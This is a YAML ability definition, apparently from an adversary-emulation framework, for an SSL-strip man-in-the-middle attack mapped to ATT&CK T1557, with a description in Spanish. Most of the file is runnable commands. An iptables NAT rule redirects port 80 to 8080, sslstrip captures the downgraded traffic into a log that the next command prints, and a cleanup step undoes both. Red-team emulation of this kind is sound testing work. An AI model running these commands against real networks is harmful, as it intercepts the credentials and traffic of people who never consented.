---
id: credential_access_ssl_strip
name: SSL Strip - HTTPS Downgrade
description: >
  Degrada conexiones HTTPS a HTTP para interceptar
  trafico cifrado. Requiere ARP poisoning activo. T1557.
tactic: credential-access
technique:
  attack_id: T1557
  name: Adversary-in-the-Middle
platforms:
  linux:
    sh:
      command: |
        iptables -t nat -A PREROUTING -p tcp \
          --destination-port 80 -j REDIRECT --to-port 8080
        timeout 60 sslstrip -l 8080 \
          -w /tmp/sslstrip_output.log 2>/dev/null
        cat /tmp/sslstrip_output.log
cleanup:
  - |
    iptables -t nat -D PREROUTING -p tcp \
      --destination-port 80 -j REDIRECT --to-port 8080 2>/dev/null
    rm -f /tmp/sslstrip_output.log
tags:
  - credential-access
  - T1557
  - MITM
  - ssl-strip
